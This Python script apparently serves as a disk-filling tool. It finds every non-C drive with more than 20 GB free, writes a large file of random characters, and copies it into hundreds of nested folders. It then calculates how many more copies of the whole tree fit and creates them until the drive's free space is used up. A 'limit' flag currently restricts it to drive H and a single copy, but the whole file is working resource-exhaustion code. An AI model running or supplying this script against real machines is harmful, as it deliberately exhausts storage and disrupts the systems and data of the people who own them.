import os
import shutil
import random
import string
# import tqdm

limit=True

path = ''
ground='THE IRON GRAVE'
space='DARKNIGHT'
folna='LORD'
filna='PRITHWISH'
slel='SECTOR'

a=list(string.printable)
a=a[0:len(a)-2]
a.extend(list('\n '*5))
random.shuffle(a)
atext=''


tm=100      #text maker 100
fol=100     #no of folder 100
fil=50      #no of files 50
mul=100    #no of times text is writen 1000
def drisel() :
    ini=list(string.ascii_uppercase)
    ini.remove('C')
    disks=[]
    for i in ini :
        
        try :
            b=shutil.disk_usage(f'{i}:')
            # print(b)
            if b[2]//2**30 >20 :
                # disks.append((i,(b[0]//2**30,b[1]//2**30,b[2]//2**30)))
                disks.append(i)
                
        except FileNotFoundError : pass
    if limit :
        return(['H'])    
    return(disks)


def place() :
    global path
    
    if not os.path.exists(path):
        os.mkdir(path)
    path+=f'\\{space}'
    
    num=0
    while os.path.exists(f'{path}-{num}'):
        # shutil.rmtree(path)
        num+=1
    os.mkdir(f'{path}-{num}')
    path+=f'-{num}\\{slel}'
    # print(path)
    os.mkdir(path)

def text_maker() :
    global atext    
    for _ in range(tm**2):
        atext+=str(random.choice(a))    

def create() :
    os.mkdir(f'{path}\\{folna}')

    
    with open(f'{path}\\{folna}\\{filna}.txt', 'w') as fi:
        # text_maker()
        fi.write(atext*mul)
    filedupe()    

def filedupe() :
    for i in range(fil) :
        shutil.copy(f'{path}\\{folna}\\{filna}.txt',f'{path}\\{folna}\\{filna} {i}.txt')

def dupe() :
    for i in range(fol) :
        shutil.copytree(f'{path}//{folna}',f'{path}//{folna} {i}')

def calculate() :
    a=os.path.getsize(f'{path}\\{folna}\\{filna}.txt')*(fil+1)*(fol+1)
    a=a+a*.095
    b=shutil.disk_usage('H:')[2]
    return(b//a)

def fillup(x) :
    if limit :
        print(x)
        if x>1 : x=1
    for i in range(x) :
        shutil.copytree(path,f'{path}@{i}')
        print(i)

def run() :
    global path
    text_maker()
    for i in drisel() :
        path=f'{i}://{ground}'
        place()
        create()
        dupe()
        fillup(calculate())
    
    
run()